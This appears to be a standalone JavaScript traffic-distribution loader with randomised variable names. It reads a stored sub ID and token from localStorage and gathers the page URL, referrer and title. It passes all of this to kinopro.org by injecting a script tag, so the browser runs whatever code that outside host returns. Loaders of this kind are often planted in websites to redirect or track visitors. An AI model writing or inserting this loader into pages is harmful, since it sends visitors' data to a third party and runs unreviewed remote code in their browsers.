    (function() {
    var name = '_8v2rS8tqpBcY6fwS';
    if (!window._8v2rS8tqpBcY6fwS) {
        window._8v2rS8tqpBcY6fwS = {
            unique: true,
            ttl: 86400,
            R_PATH: 'https://kinopro.org/T5tgFS61',
            P_PATH: 'https://kinopro.org/19d4412/postback',
        };
    }
    const _PxStTDgBKVyNLtsM = localStorage.getItem('config');
    if (typeof _PxStTDgBKVyNLtsM !== 'undefined' && _PxStTDgBKVyNLtsM !== null) {
        var _1vDSfLrk6MGMbQVZ = JSON.parse(_PxStTDgBKVyNLtsM);
        var _4QqqnFXBvXXybX93 = Math.round(+new Date()/1000);
        if (_1vDSfLrk6MGMbQVZ.created_at + window._8v2rS8tqpBcY6fwS.ttl < _4QqqnFXBvXXybX93) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _mgPxCNBMy2dHBWTT = localStorage.getItem('subId');
    var _WpJGK9W9cDJgKmjq = localStorage.getItem('token');
    var _X7qnFNvySYvbcYNK = '?return=js.client';
        _X7qnFNvySYvbcYNK += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _X7qnFNvySYvbcYNK += '&se_referrer=' + encodeURIComponent(document.referrer);
        _X7qnFNvySYvbcYNK += '&default_keyword=' + encodeURIComponent(document.title);
        _X7qnFNvySYvbcYNK += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _X7qnFNvySYvbcYNK += '&name=' + encodeURIComponent(name);
    if (typeof _mgPxCNBMy2dHBWTT !== 'undefined' && _mgPxCNBMy2dHBWTT && window._8v2rS8tqpBcY6fwS.unique) {
        _X7qnFNvySYvbcYNK += '&sub_id=' + encodeURIComponent(_mgPxCNBMy2dHBWTT);
    }
    if (typeof _WpJGK9W9cDJgKmjq !== 'undefined' && _WpJGK9W9cDJgKmjq && window._8v2rS8tqpBcY6fwS.unique) {
        _X7qnFNvySYvbcYNK += '&token=' + encodeURIComponent(_WpJGK9W9cDJgKmjq);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._8v2rS8tqpBcY6fwS.R_PATH + _X7qnFNvySYvbcYNK;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
